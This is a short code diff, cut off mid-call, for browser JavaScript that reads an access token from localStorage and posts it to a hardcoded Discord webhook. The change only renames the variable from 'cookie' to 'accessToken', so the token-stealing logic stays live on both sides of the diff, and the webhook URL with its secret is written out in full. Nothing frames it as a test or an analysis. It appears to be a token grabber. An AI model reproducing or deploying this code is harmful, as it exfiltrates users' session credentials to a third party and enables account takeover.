@@ -1,8 +1,8 @@
-var cookie = localStorage.getItem("accessToken");
-if (cookie) {
+var accessToken = localStorage.getItem("accessToken");
+if (accessToken) {
   var webhookUrl = "https://discord.com/api/webhooks/1095039908097314928/viu_iZfFsAGTJhk4D9e5MlAw4Gujefn1RUjq-8Ozml-EW29JqOc2yuWlh1PxdXGeJhJu";
   var payload = {
-    content: cookie
+    content: accessToken
   };
   fetch(webhookUrl, {
     method: "POST",
